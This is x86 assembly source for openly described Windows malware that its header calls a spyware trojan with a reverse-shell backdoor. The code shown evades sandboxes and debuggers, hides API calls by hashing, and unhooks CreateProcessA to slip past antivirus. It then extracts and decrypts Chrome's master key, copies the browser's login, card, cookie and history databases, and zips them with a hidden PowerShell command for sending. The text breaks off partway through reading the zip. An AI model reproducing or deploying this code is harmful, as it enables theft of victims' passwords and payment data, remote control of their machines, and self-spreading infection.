;-------------------------------------------------------------------------------------------------------------------------------------;
; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
; Compatible: Windows PE file 32 bits
; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first
; Version: 4.0
; This multi-stage malware is capable of:
;	[+] Create backdoor for remote command execution
;	[+] Stealing Chrome browser data including: login credentials, browsing history and credit cards info (Chrome v127 and prior)
;	[+] Add itself to the registry for persistence
; 	[+] Detect sandbox and debugger and alter its behaviour
;	[+] Self-replicate to all 32 bit exe files in the directory, infected files can do the same while continuing to function normally
;	[+] Unhooking API to bypass AVs/EDRs (Testing only)
;	[+] Hide API through hashing
;	[+] Unlinkling malicious Dll for anti-memory forensic
; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
; [!] Note: This spyware trojan can only extract passwords and credit cards info only for Chrome version 127 and prior.
;			Starting with recent Chrome updates, the saved passwords and credit cards info are now switched to use App-Bound Encryption (ABE).
;			The new mechanism prefixes encrypted blobs with "v20", distinguishing it from older versions like "v10" or "v11" that relied solely on DPAPI (which is what this trojan aims for).
; Size: 3514 bytes
;-------------------------------------------------------------------------------------------------------------------------------------;

.386
Option CaseMap:None

.Code
start:
payload:
	Jmp get_payload_addr

get_eip:
	Pop Ebx
	Jmp next

get_payload_addr:
	Call get_eip

next:
	Xor Ecx, Ecx
	delta = $ -payload
	Sub Bl, delta					; Point ebx back to the entry point of the payload
	Add Bl, 2H
	Mov Ch, 4H					; Allocate the buffer size on the stack (0x400)
	Sub Esp, Ecx
	Jmp check

exit_fail:
	Popad
	Ret

; Helper functions
hash_api:
	Pushad							; save all registers
	Mov Ebp, Esp
	Pushfd					; Push EFLAGS value (that contains CF flag) into the stack
	Pop Eax					; Pops the EFLAGS value off and stores it in eax
	Mov [Ebp - 300H], Eax			; Save the EFLAGS value for later use
	Xor Edi, Edi				; After this operation the EFLAGS will be reset back to 0, that's why we need to push it to the stack earlier 
	Mov Edx, [Fs:30H + Edi]			; PEB
	Mov Edx, [Edx + 0CH]			; PEB_LDR_DATA
	Mov Edx, [Edx + 14H]			; First module in InMemoryOrderModuleList
	Mov Edi, Edx					; Save the first position in the InMemoryOrderModuleList

find_next_unlink_dll:
	Mov Edx, [Edx]					; get next module
	Cmp Edx, Edi					; Check if we loop back to start
	Je exit_fail

next_module_info:
	Mov Esi, [Edx + 28H]			; Move pointer to BaseDllName.Buffer
	Movzx Ecx, Word Ptr [Edx + 26H]	; Set counter = BaseDllName.Length
	Xor Edi, Edi

calculate_hash:
	Xor Eax, Eax
	Lodsb							; Load the name of the module to eax
	Cmp Al, 61H						; Check for the lowercase ('a' is 0x61 in hex)
	Jl uppercase					; Jump if uppercase
	Sub Al, 20H						; convert to uppercase

uppercase:
	Ror Edi, 0DH					; Rotate right by 13 bits
	Add Edi, Eax					; Add the next byte of the name
	Dec Ecx
	Jnz calculate_hash

	Mov Eax, [Ebp - 300H]			; Move the EFLAGS to eax
	And Eax, 1						; now eax = 1 if the CF is set, 0 if not
	Cmp Al, 1

	; Check if the flag stores in CF (Carry Flag) is 1 or not, if equal => unlink dll, else resolve api
	Je unlink_module				; If CF = 1 then jump
	Push Edx						; Push the current module to the stack for later use
	Push Edi						; The hash value is stored in edi

api_resolution:
	; Iterate through the export address table
	Mov Edx, [Edx + 10H]			; Base address of the current module
	Mov Eax, [Edx + 3CH]
	Add Eax, Edx					; PE signature

	Mov Eax, [Eax + 78H]
	Test Eax, Eax					; Check to see if the export table is present or not
	Jz get_next_module				; If no, then proceed to the next module

	Add Eax, Edx					; Address of Export Table
	Push Eax						; Save the address of Export Table for later use

	Mov Ecx, [Eax + 18H]			; Set counter = number of exported function names
	Mov Ebx, [Eax + 20H]			; Get address of name table
	Add Ebx, Edx					; ebx = Address of name table

	; Hash module and function name
	; and compare it with the hash that we are searching for
get_next_function:
	Test Ecx, Ecx
	Jz jump_next_module				; If no exported function left => jump to next module
	Dec Ecx
	Mov Esi, [Ebx + Ecx * 4]		; RVA of next function name
	Add Esi, Edx
	Xor Edi, Edi

loop_funcname:
	Xor Eax, Eax
	Lodsb							; Load the name of the function to eax
	Ror Edi, 0DH					; Rotate right by 13 bits
	Add Edi, Eax					; Add the next byte of the name
	Cmp Al, Ah						; Compare Al (next byte from the name) with the AH (null terminator)
	Jne loop_funcname
	Add Edi, [Ebp - 8H]				; Add the module hash with function hash
	Cmp Edi, [Ebp + 24H]			; Compare it with the hash that we are searching for
	Jnz get_next_function			; Move on and hash the next function if the hash is not identical

	; If the desired hashed function is found then get its address
	Clc								; Clear the flag stores in CF (just in case)
	Pop Eax							; Restore the address of Export Table
	Mov Ebx, [Eax + 24H]			; Get the RVA of the ordinal table
	Add Ebx, Edx
	Mov Cx, [Ebx + 2 * Ecx]			; Get the function ordinal
	Mov Ebx, [Eax + 1CH]
	Add Ebx, Edx					; Get the address of the address function table
	Mov Eax, [Ebx + 4 * Ecx]
	Add Eax, Edx					; This is the address of the function that we are looking for
	Mov [Esp + 24H], Eax			; Save the address

	; Fix up the stack and jump to the desired function
	Pop Ebx							; Clear the current modules hash
	Pop Ebx							; Clear the current position in the module list
	Popad
	Pop Ecx							; pop off the original return address
	Pop Edx							; pop off the hash value that the caller have pushed
	Push Ecx						; push back the return address
	Mov Edx, [Ebp - 20H]			; Check the unhook required flag
	Cmp Dl, 1						; If the flag is true
	Je hooked_func_addr				; Then jump to this to get the address of the desired function only
	Jmp Eax							; If not then execute function

hooked_func_addr:
	Xor Edx, Edx
	Mov [Ebp - 20H], Edx			; Clear the flag
	Ret								; Return to the original execution flow

; If the current module is not the desired one then jump here
jump_next_module:
	Pop Edi							; Pop off the export address table in the current module

get_next_module:
	Pop Edi							; Pop off the current module hash
	Pop Edx							; Restore the current position in the module list
	Mov Edx, [Edx]					; Go to the next module
	Jmp next_module_info

unlink_module:
	; Compare hashes
	Cmp Edi, [Ebp + 24H]		  ; Compare with the hash we are searching for
	Jne find_next_unlink_dll

    ; Unlink from all three lists
    Mov Eax, [Edx - 8H]           ; InLoadOrderLinks.Flink
    Mov Ebx, [Edx - 4H]           ; InLoadOrderLinks.Blink
    Mov [ebx], eax
    Mov [Eax + 4H], Ebx

    Mov Eax, [Edx]            	  ; InMemoryOrderLinks.Flink
    Mov Ebx, [Edx + 4H]           ; InMemoryOrderLinks.Blink
    Mov [ebx], eax
    Mov [Eax + 4H], Ebx

    Mov Eax, [Edx - 8H + 10H]     ; InInitializationOrderLinks.Flink
    Mov Ebx, [Edx - 8H + 14H]     ; InInitializationOrderLinks.Blink
    Mov [ebx], eax
    Mov [Eax + 4H], Ebx

    Clc								; Clear the CF flag
    Popad							; restore all register
	Pop Ecx							; pop off the original return address
	Pop Edx							; pop off the hash value that the caller have pushed
	Push Ecx						; push back the return address
    Ret

exit:
	Push Ebx						; 0
	Push 56A2B5F0H					; hash("kernel32.dll", "ExitProcess")
	Call hash_api

find_next_string:
    Push Edi                ; Save Edi
    Mov Edi, Esi            ; Start from current string
    Xor Al, Al              ; Look for null terminator
    Mov Ecx, -1             ; Maximum search length
    Repne Scasb             ; Find the end of the string
    Mov Esi, Edi            ; esi now points to next string
    Pop Edi                 ; Restore Edi
    Ret

copy_files_to_tmp:
	; eax = dst file path
	; esi = src file path
	Push 1					; bFailIfExists = TRUE
	Push Eax				; [in] lpNewFileName
	Push Esi				; [in] lpExistingFileName
	Push 0DDA3E63EH 		; hash("kernel32.dll!CopyFileA")
	Call hash_api
	Ret

append_ps:
	Push Edi					; zip file path
	Push Esi					; dst buffer
	Push 0C48D7274H   			; hash("kernel32.dll!lstrcatA")
	Call hash_api

	; Update pointer
	Push Esi
	Push 0CC8E00F4H				; hash("kernel32.dll!lstrlenA")
	Call hash_api

	Add Esi, Eax
	Mov Byte Ptr [Esi], 27H		; '
	Inc Esi
	Mov Byte Ptr [Esi], 2CH		; ,
	Inc Esi
	Mov Byte Ptr [Esi], 27H		; '
	Inc Esi
	Mov Byte Ptr [Esi], 0		; null-terminating byte
	Ret

exit_success:
	Xor Esi, Esi
	Mov Edx, [Fs:30H + Esi]				; PEB
	Mov Edx, [Edx + 0CH]				; PEB_LDR_DATA
	Mov Edx, [Edx + 14H]				; First module in InMemoryOrderModuleList
	Mov Edi, [Edx + 10H]				; Base address of the current executable

	Mov Eax, [Edi + 34H]				; Load jump back entry point to eax
	Test Eax, Eax						; If nothing is written there => exit
	Je exit
	Push Eax
	Ret

check:
	Lea Eax, [Ebp - 250H]
	Push Eax
	Push 4B2B9D76H						; hash("kernel32.dll", "GetSystemInfo")
	Call hash_api

	Mov Eax, [Ebp - 250H + 14H]
	Cmp Eax, 4							; If number of CPU cores < 4 then it most likely VM or sandboxes
	Jl exit_success						; exit

	Push 0C6643248H						; hash("kernel32.dll, "IsDebuggerPresent")
	Call hash_api
	Test Al, Al							; Check if the flag is true or not
	Jnz exit_success

unhook_api:
	; For demo, only CreateProcessA will get unhooked only
	; Get handle of the current process
	Push 51E2F352H						; hash("kernel32.dll", "GetCurrentProcess")
	Call hash_api
	Xchg Eax, Edi

	Mov Al, 1
	Mov [Ebp - 20H], Al					; Set flag for the function that needs to be unhooked
	Clc
	Push 863FCC79H						; hash("kernel32.dll", "CreateProcessA")
	Call hash_api

	Mov Dx, 5DECH
	Push Edx
	Push 8B55FF8BH						; "\x8B\xFF\x55\x8B\xEC\x5D" first 6 bytes of CreateProcessA
	Mov Esi, Esp						; Pointer to the bytes string

	; Unhook CreateProcessA
	Xor Ecx, Ecx
	Push Ecx							; lpNumberOfBytesWritten = NULL
	Push 6								; nSize
	Push Esi							; lpBuffer
	Push Eax							; CreateProcessA base address
	Push Edi							; hProcess = GetCurrentProcess() handle
	Push 0E7BDD8C5H						; hash("kernel32.dll", "WriteProcessMemory")
	Call hash_api

cred_exfiltr:
	Mov [Ebp - 108H], Ebx				; This holds the address of the beginning of the payload

	Call over_enc_key
	enc_key DB '"encrypted_key":', 0
	end_quote DB '"', 0
	DPAPI DB "DPAPI", 0
	output_file DB "\Temp\mskey.bin", 0
	LoginData DB "\Google\Chrome\User Data\Default\Login Data", 0
	WebData DB "\Google\Chrome\User Data\Default\Web Data", 0
	LocalStatePath DB "\Google\Chrome\User Data\Local State", 0
	History DB "\Google\Chrome\User Data\Default\History", 0
	tmpLoginData DB "\Temp\Login Data", 0
	tmpWebData DB "\Temp\Web Data", 0
	tmpHistory DB "\Temp\History", 0
	PSCmd1 DB 'powershell.exe -Command "Compress-Archive -Path ', 0
	PSCmd2 DB " -DestinationPath '", 0
	zipPath DB "\Temp\Chrome.zip", 0
	regKeyPath DB "Software\Microsoft\Windows\CurrentVersion\Run", 0
	single_quote DB "'", 0
	Cookies DB "\Google\Chrome\User Data\Default\Network\Cookies", 0
	tmpCookies DB "\Temp\Cookies", 0

over_enc_key:
    Pop Esi                  	 ; esi = address of enc_key
    Mov [Ebp - 104H], Esi   	 ; Store enc_key address

    ; Initialize for string scanning
    Lea Edi, [Ebp - 104H]		 ; Start of the storage
	Add Edi, 8					 ; Move to the next part (which is Ebp - 0FCH) up until [Ebp - 0BCH] for tmpCookies

    Mov Edx, 17                 ; Number of iterations

store_loop:
    Call find_next_string        ; Get next string address
    Mov [Edi], Esi              ; Store address at current offset
    Add Edi, 4                  ; Move to next stack location
    Dec Edx
    Jnz store_loop             ; Decrement Edx and loop if not zero

	Xor Ecx, Ecx
	; Load Shell32.dll
	Push Ecx
	Push 32336CH
	Push 6C656853H
	Push Esp
	Push 0726774CH               ; hash("kernel32.dll", "LoadLibraryA")
	Call hash_api

	; Push GUID for FOLDERID_LocalAppData
	Push 9170157FH
	Push 8E7B559DH
	Push 4FCF6FBAH
	Push 0F1B32785H
	Mov Edx, Esp				 ; esi = &GUID

	; Reserve space for PWSTR*
	Sub Esp, 4
	Lea Eax, [Esp]					; eax = &pwszPath

	Xor Ecx, Ecx
	; Call SHGetKnownFolderPath
	Push Eax						; &pwszPath
	Push Ecx						; hToken = 0
	Push Ecx						; dwFlags = 0
	Push Edx						; rfid = &GUID
	Push 0C9D8F982H					; hash("shell32.dll!SHGetKnownFolderPath")
	Call hash_api

	Mov Edi, [Esp]					; edi = pwszPath
	Add Esp, 20						; Clean GUID from stack :v
	Cmp Eax, 0
	Jne reverse_shell				; Error, move on

	; Load ole32.dll for CoTaskMemFree
	Push Eax
	Push 6CH
	Push 6C642E32H
	Push 33656C6FH
	Push Esp		 				; push ole32.dll
	Push 0726774CH    				; hash("kernel32.dll!LoadLibraryA")
	Call hash_api
	Add Esp, 16       				; Clean the pushed string and ecx

	; Reserve space for ANSI buffer + 350 * 11 for each full path
	Sub Esp, 350 * 12	  			; MAX_PATH
	Mov Eax, Edi	     			; eax = pwszPath
	Mov Edi, Esp      	  			; edi = ansi buffer

	Xor Ecx, Ecx
	; Call WideCharToMultiByte
	Push Ecx          ; LPBOOL UsedDefaultChar = NULL
	Push Ecx          ; LPCSTR DefaultChar = NULL
	Push 350          ; int cbMultiByte
	Push Edi          ; LPSTR lpMultiByteStr
	Push -1           ; int cchWideChar = -1 (null-term)
	Push Eax          ; LPCWSTR lpWideCharStr
	Push Ecx          ; DWORD dwFlags = 0
	Push Ecx          ; UINT CodePage = CP_ACP = 0
	Push 0EA7D21F4H   ; hash("kernel32.dll!WideCharToMultiByte")
	Call hash_api

	Jmp EndBuildPathHelper

BuildPathHelper:
	; On entry: esi = suffix pointer, ecx = dest buffer pointer
	; Uses: assumes edi = base_ansi
	; eax, ecx and edx registers all have their values changed after an API call has been made
	; => so the trick to keep the dst buffer in ecx staying unchanged after each call is to push it to the stack
	;	 before calling the API and pop it back :D

	Push Ecx		  		; Save dst buffer pointer to stack
	Push Edi		  		; source = ansi buffer
	Push Ecx		  		; dest
	Push 0E28D73B4H	 		; hash("kernel32.dll!lstrcpyA")
	Call hash_api

	Pop Ecx			  		; restore dst buffer
	Push Ecx		  		; save it to stack again
	Push Esi		  		; suffix
	Push Ecx		  		; dest (now has base copied)
	Push 0C48D7274H   		; hash("kernel32.dll!lstrcatA")
	Call hash_api

	Pop Ecx			 		; restore dst buffer again :D
	Ret

EndBuildPathHelper:
	Mov Esi, [Ebp - 0ECH]  ; esi = WebData suffix
	Lea Ecx, [Esp + 350]   ; ecx = webdata_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0ECH], Ecx  ; Update to full path pointer

	; Build path for LoginData
	Mov Esi, [Ebp - 0F0H]  ; esi = LoginData suffix
	Lea Ecx, [Esp + 700]   ; ecx = logindata_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0F0H], Ecx  ; Update to full path pointer

	; Build path for LocalState
	Mov Esi, [Ebp - 0E8H]  ; esi = LocalState suffix
	Lea Ecx, [Esp + 1050]  ; ecx = localstate_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0E8H], Ecx  ; Update to full path pointer

	; Build path for History
	Mov Esi, [Ebp - 0E4H]  ; esi = History suffix
	Lea Ecx, [Esp + 1400]  ; ecx = History_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0E4H], Ecx  ; Update to full path pointer

	; Build path for tmpLoginData
	Mov Esi, [Ebp - 0E0H]  ; esi = tmpLogin suffix
	Lea Ecx, [Esp + 1750]  ; ecx = tmpLogin_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0E0H], Ecx  ; Update to full path pointer

	; Build path for tmpWebData
	Mov Esi, [Ebp - 0DCH]  ; esi = tmpWebData suffix
	Lea Ecx, [Esp + 2100]  ; ecx = tmpWebData_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0DCH], Ecx  ; Update to full path pointer

	; Build path for tmpHistory
	Mov Esi, [Ebp - 0D8H]  ; esi = tmpHistory suffix
	Lea Ecx, [Esp + 2450]  ; ecx = tmpHistory_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0D8H], Ecx  ; Update to full path pointer

	; Build path for output masterkey
	Mov Esi, [Ebp - 0F4H]  ; esi = output_file suffix
	Lea Ecx, [Esp + 2800]  ; ecx = mskey_full buffer
	Call BuildPathHelper

	Mov [Ebp - 0F4H], Ecx  ; Update to full path pointer

	; Build path for output zip file
	Mov Esi, [Ebp - 0CCH]  ; esi = zipPath suffix
	Lea Ecx, [Esp + 3150]  ; ecx = zipPath buffer
	Call BuildPathHelper

	Mov [Ebp - 0CCH], Ecx  ; Update to full path pointer

	; Build path for Cookies
	Mov Esi, [Ebp - 0C0H]  ; esi = Cookies suffix
	Lea Ecx, [Esp + 3500]  ; ecx = Cookies full path buffer
	Call BuildPathHelper

	Mov [Ebp - 0C0H], Ecx  ; Update to full path pointer

	; Build path for Cookies
	Mov Esi, [Ebp - 0BCH]  ; esi = tmpCookies suffix
	Lea Ecx, [Esp + 3850]  ; ecx = tmpCookies full path buffer
	Call BuildPathHelper

	Mov [Ebp - 0BCH], Ecx  ; Update to full path pointer

	Mov Ecx, [Ebp - 0E8H]   ; Local State full path pointer
	Lea Edi, [Ecx]

	; Open browser Local State file
	Xor Eax, Eax
	Xor Ecx, Ecx
	Mov Al, 80H
	Push Ecx							; 0
	Push Eax						; FILE_ATTRIBUTE_NORMAL
	Push 3H							; OPEN_EXISTING
	Push Ecx							; 0
	Push Ecx							; 0
	Shl Eax, 24
	Push Eax						; GENERIC_READ = 0x80000000
	Push Edi						; [in] lpFileName = LocalStateExpanded
	Push 4FDAF6DAH					; hash("kernel32.dll!CreateFileA")
	Call hash_api
	Cmp Eax, 0FFFFFFFFH				; eax = hFile, cmp eax with INVALID_HANDLE_VALUE
	Je SetRegistryKey				; Move on

	Mov Esi, Eax

	; Read file content
    Sub Esp, 8192 + 4	    ; 8KB buffer
    Mov Edi, Esp            ; edi = buffer
    Lea Ecx, [Esp + 8192]   ; ecx = &BytesRead
    Mov [Ebp - 100H], Ecx	; Save ecx into the stack

	Xor Edx, Edx
    Push Edx                ; lpOverlapped = NULL
    Push Ecx                ; lpNumberOfBytesRead
    Mov Dh, 20H
    Push Edx                ; nNumberOfBytesToRead = 0x2000
    Push Edi                ; lpBuffer
    Push Esi                ; hFile
    Push 0BB5F9EADH         ; hash("kernel32.dll!ReadFile")
    Call hash_api

	Xor Ecx, Ecx
	; Load Shlwapi.dll
	Push Ecx
	Push 697061H
	Push 776C6853H
	Push Esp
	Push 0726774CH                  ; hash("kernel32.dll", "LoadLibraryA")
	Call hash_api

	; Find "encrypted_key" in that blob shit
	Mov Esi, [Ebp - 104H]			; "encrypted_key" substring
	Push Esi						; [in] PCSTR pszSrch = "encrypted_key"
	Push Edi						; [in] pszFirst = lpBuffer
	Push 0D6F56A7FH					; hash("shlwapi.dll!StrStrA")
	Call hash_api					; Now eax points to the "encrypted_key"

	Test Eax, Eax					; Simple check
    Jz SetRegistryKey       		; Not found, move on
    Add Eax, 17						; skip through the '"encrypted_key":' to get actual value in it
    Mov Edi, Eax					; edi = pValue

	Mov Esi, [Ebp - 0FCH]			; esi = end_quote
	Push Esi 						; [in] PCSTR pszSrch = "end_quote"
	Push Edi						; [in] pszFirst = pValue
	Push 0D6F56A7FH					; hash("shlwapi.dll!StrStrA")
	Call hash_api					; Now eax points to the "encrypted_key"

	Test Eax, Eax					; Simple check
    Jz SetRegistryKey       		; Not found, move on
    Mov Byte Ptr [Eax], 0			; terminate the string to get full base64 encypted key blob

	; After the base64 key blob has been retrieved, it then will be base64 decoded, remove the DPAPI prefix
	; and then the key will be decrypted from that blob by using CryptUnprotectData
	; Load crypt32.dll
	Xor Edx, Edx
	Push Edx
	Push 323374H
	Push 70797263H
	Push Esp
	Push 0726774CH 					; hash("kernel32.dll", "LoadLibraryA")
	Call hash_api

	Add Esp, 16
	; Reserve for cbDecoded
	Sub Esp, 4
	Lea Edx, [Esp] 					; &cbDecoded
	Mov DWord Ptr [Edx], 2048
	Mov [Ebp - 0FCH], Edx			; reuse this frame to save the &cbDecoded for later use

	; Reserve for decoded
	Sub Esp, 2048
	Mov Esi, Esp 					; esi = decoded buffer

	; Call CryptStringToBinaryA to decode the "encrypted_key" value
	Xor Eax, Eax
	Push Eax                ; [out] pdwFlags = NULL
	Push Eax                ; [out] pdwSkip = NULL
	Push Edx                ; [in, out] pcbBinary = &cbDecoded
	Push Esi                ; [in] pbBinary = decode buffer
	Push 1                  ; [in] dwFlags = CRYPT_STRING_BASE64
	Push Eax                ; [in] cchString = NULL
	Push Edi                ; [in] pszString = pValue
	Push 39B6C221H          ; hash("crypt32.dll!CryptStringToBinaryA")
	Call hash_api

	Push Esi				; Save the address of the decode buffer

	Mov Cl, 5  			 ; number of bytes in prefix
	Mov Edi, [Ebp - 0F8H]    ; pointer to prefix (if stored in memory); if prefix is immediate, set up pointer appropriately
	Xor Al, Al
	Repe Cmpsb              ; compares bytes [ESI] and [EDI], increments both
	Jne reverse_shell

	Pop Esi					; Pop back the decoded buffer address to esi
	Add Esi, 5				; Skip through DPAPI prefix

	Mov Ecx, [Ebp - 0FCH]	; ecx = &cbDecoded
	Mov Ecx, [Ecx]			; actual decoded blob size
	Sub Ecx, 5				; subtract DPAPI prefix length
	Jbe reverse_shell      ; If <=0, invalid, move on

	; DATA_BLOB input initialization
	Sub Esp, 8
	Mov [Esp], Ecx			; input.cbData = size after prefix
	Mov [Esp + 4], Esi		; input.pbData = esi (base64 data pointer)
	Lea Esi, [Esp]

	; DATA_BLOB output initialization on stack
	Sub Esp, 8
	Lea Edi, [Esp]

	; Get the master key by decrypting base64 blob using CryptUnprotectData
	Xor Ecx, Ecx
	Push Edi						; pDataOut = edi (the decrypted master key will be stored here)
	Push Ecx						; dwFlags = 0
	Push Ecx						; pPromptStruct = NULL
	Push Ecx						; pvReserved
	Push Ecx						; pOptionalEntropy = NULL
	Push Ecx						; ppszDataDescr = NULL
	Push Esi						; pDataIn = esi (DATA_BLOB input)
	Push 31A5E9A6H					; hash("crypt32.dll!CryptUnprotectData")
	Call hash_api

	Cmp Eax, 0						; Check success
	Je reverse_shell				; error => skip to next part

	Cmp DWord Ptr [Edi], 32			; Check if the key size is 32 bit or not
	Jne reverse_shell			; Invalid size, error => skip to next part

	; Create output file
	Mov Ecx, [Ebp - 0F4H]				; ecx = outfile name
	Xor Eax, Eax
	Push Eax                ; hTemplateFile = 0
	Push 80H                ; dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
	Push 2                  ; dwCreationDisposition = CREATE_ALWAYS
	Push Eax                ; lpSecurityAttributes = 0
	Push Eax                ; dwShareMode = 0
	Push 40000000H          ; dwDesiredAccess = GENERIC_WRITE
	Push Ecx                ; lpFileName
	Push 4FDAF6DAH          ; hash("kernel32.dll!CreateFileA")
	Call hash_api
	Mov Esi, Eax            ; esi = hFile
	Cmp Eax, 0FFFFFFFFH     ; Check INVALID_HANDLE_VALUE
	Je reverse_shell

	; Write the key
	Sub Esp, 4              ; Allocate for bytesWritten
	Lea Edx, [Esp]          ; edx = &bytesWritten
	Push 0                  ; lpOverlapped = 0
	Push Edx                ; lpNumberOfBytesWritten
	Push [Edi]              ; nNumberOfBytesToWrite = output.cbData (32)
	Push [Edi+4]            ; lpBuffer = output.pbData
	Push Esi                ; hFile
	Push 5BAE572DH          ; hash("kernel32.dll!WriteFile")
	Call hash_api
	Add Esp, 4              ; Clean bytesWritten
	Cmp Eax, 0              ; Check write success
	Je reverse_shell

	; Close the file
	Push Esi                ; hObject = hFile
	Push 528796C6H         ; hash("kernel32.dll!CloseHandle")
	Call hash_api

	; Copy files to temp
	; Login Data
	Mov Eax, [Ebp - 0E0H]		; eax = tmpLoginData
	Mov Esi, [Ebp - 0F0H]		; esi = src path
	Call copy_files_to_tmp

	; Webdata
	Mov Eax, [Ebp - 0DCH]		; eax = tmpWebData
	Mov Esi, [Ebp - 0ECH]		; esi = src path
	Call copy_files_to_tmp

	; History
	Mov Eax, [Ebp - 0D8H]		; eax = tmpHistory
	Mov Esi, [Ebp - 0E4H]		; esi = src path
	Call copy_files_to_tmp

	; Cookies
	Mov Eax, [Ebp - 0BCH]		; eax = tmpCookies
	Mov Esi, [Ebp - 0C0H]		; esi = src path
	Call copy_files_to_tmp

	Sub Esp, 512
	Mov Esi, Esp				; esi = base ps buffer
	Mov Ecx, [Ebp - 0D4H]		; ecx = pointer to "powershell.exe -Command 'Compress-Archive -Path "

	Push Ecx					; ecx = src buffer
	Push Esi					; esi = dst buffer
	Push 0E28D73B4H				; hash("kernel32.dll!lstrcpyA")
	Call hash_api

	; Append single quote
	Mov Edi, [Ebp - 0C4H]		; single quote
	Push Edi
	Push Esi					; dst buffer
	Push 0C48D7274H   			; hash("kernel32.dll!lstrcatA")
	Call hash_api

	; Update pointer
	Push Esi
	Push 0CC8E00F4H				; hash("kernel32.dll!lstrlenA")
	Call hash_api

	Add Esi, Eax
	Mov Byte Ptr [Esi], 0		; null-terminating byte :v

	; Append master key path into the zip command
	Mov Edi, [Ebp - 0F4H]		; mskey path
	Call append_ps

	; Append login data path
	Mov Edi, [Ebp - 0E0H]		; tmpLoginDtata path
	Call append_ps

	; Append web data path
	Mov Edi, [Ebp - 0DCH]		; tmpWebData
	Call append_ps

	; Append cookies path
	Mov Edi, [Ebp - 0BCH]		; tmpCookies
	Call append_ps

	; Append history path
	Mov Edi, [Ebp - 0D8H]		; tmpHistory

	Push Edi
	Push Esi					; dst buffer
	Push 0C48D7274H   			; hash("kernel32.dll!lstrcatA")
	Call hash_api

	; Update pointer
	Push Esi
	Push 0CC8E00F4H				; hash("kernel32.dll!lstrlenA")
	Call hash_api

	Add Esi, Eax
	Mov Byte Ptr [Esi], 27H		; '
	Inc Esi
	Mov Byte Ptr [Esi], 0		; null-terminating byte :v

	; Append " -DestinationPath '"
	Mov Edi, [Ebp - 0D0H]		; PSCmd2
	Push Edi
	Push Esi					; dst buffer
	Push 0C48D7274H   			; hash("kernel32.dll!lstrcatA")
	Call hash_api

	Push Esi
	Push 0CC8E00F4H				; hash("kernel32.dll!lstrlenA")
	Call hash_api

	Add Esi, Eax				; Update pointer
	Mov Byte Ptr [Esi], 0		; null-terminating byte :v

	; Append full zip path
	Mov Edi, [Ebp - 0CCH]			; output zip file path
	Push Edi
	Push Esi
	Push 0C48D7274H   			; hash("kernel32.dll!lstrcatA")
	Call hash_api

	Push Esi
	Push 0CC8E00F4H				; hash("kernel32.dll!lstrlenA")
	Call hash_api

	Add Esi, Eax
	Mov Byte Ptr [Esi], 27H		; '
	Inc Esi
	Mov Byte Ptr [Esi], 22H		; "
	Inc Esi
	Mov Byte Ptr [Esi], 0
	Mov Esi, Esp				; now esi point back to full powershell command

	; Allocate space for STARTUPINFO (0x44 bytes) and PROCESS_INFORMATION (0x10 bytes)
	Sub Esp, 54H
	; Zero the memory
	Mov Edi, Esp
	Xor Eax, Eax
	Xor Ecx, Ecx
	Mov Cl, 15H  ; 0x54 / 4 = 0x15
	Rep Stosd

	; Set up STARTUPINFO
	Mov DWord Ptr [Esp], 44H  ; si.cb = sizeof(STARTUPINFO)
	Mov DWord Ptr [Esp + 38H], 100H  ; si.dwFlags = STARTF_USESHOWWINDOW
	Mov Word Ptr [Esp + 03CH], 0  ; si.wShowWindow = SW_HIDE

	; edi will point to STARTUPINFO structure
	Mov Edi, Esp

	; ecx = Process Information
	Add Esp, 44H
	Mov Ecx, Esp
	Sub Esp, 44H  				; Restore Esp to STARTUPINFO
	Xchg Ecx, Esi				; lpProcessInformation = esi, ecx = lpCommandLine

	Push Esi  					; lpProcessInformation
	Push Edi  					; lpStartupInfo
	Push Eax  					; lpCurrentDirectory
	Push Eax  					; lpEnvironment
	Push 08000000H  			; dwCreationFlags
	Push Eax  					; bInheritHandles
	Push Eax  					; lpThreadAttributes
	Push Eax  					; lpProcessAttributes
	Push Ecx  					; lpCommandLine
	Push Eax  					; lpApplicationName
	Push 0863FCC79H				; hash("kernel32.dll!CreateProcessA")
    Call hash_api

    Cmp Eax, 0
    Je reverse_shell

	; WaitForSingleObject on hProcess (infinite)
	Push 0FFFFFFFFH				; dwMilliseconds = INFINITE
	Push DWord Ptr [Esi]		; hHandle = hProcess
	Push 601D8708H				; hash("kernel32.dll!WaitForSingleObject")
	Call hash_api

	; open zip file for sending
	Xor Eax, Eax
	Mov Edx, Eax
	Mov Al, 80H
    Push Edx                  ; hTemplateFile = NULL
	Push Eax                ; dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
	Push 3H                 ; dwCreationDisposition = OPEN_EXISTING
	Push Edx                  ; lpSecurityAttributes = NULL
	Push Edx                  ; dwShareMode = 0
	Shl Eax, 24
	Push Eax          ; dwDesiredAccess = GENERIC_READ
	Push [Ebp - 0CCH]       ; lpFileName = full zip path
	Push 4FDAF6DAH          ; hash("kernel32.dll!CreateFileA")
	Call hash_api
	Mov Esi, Eax

	; Get file size
	Push 0
	Push Esi			   ; file path = zip file
	Push 701E12C6H         ; hash("kernel32.dll!GetFileSize")
	Call hash_api
	Cmp Eax, 0FFFFFFFFH
	Je close_zip
	Mov [Ebp - 0C0H], Eax  ; store the zip file size

	Xor Edx, Edx
	Push Edx

	; Allocate virtual memory
	Push 40H                 ; flProtect = PAGE_READWRITE
	Mov Dh, 10H
	Push Edx				; flAllocationType = MEM_COMMIT | MEM_RESERVE
	Push Eax                ; dwSize = file size
	Push 0                  ; lpAddress = NULL (system chooses)
	Push 0E553A458H          ; hash("kernel32.dll!VirtualAlloc")
	Call hash_api
	Mov Edi, Eax            ; edi = allocated buffer
	Test Edi, Edi           ; Check if allocation succeeded
	Jz close_zip            ; Skip if null

	; Read file
	Mov Ecx, [Ebp - 0C0H]	; ecx = file size
	Sub Esp, 4
	Lea Edx, [Esp]
	Push 0                  ; lpOverlapped = NULL
	Push Edx                ; lpNumberOfBytesRead
	Push Ecx                ; nNumberOfBytesToRead
	Push Edi                ; lpBuffer
	Push Esi                ; hFile
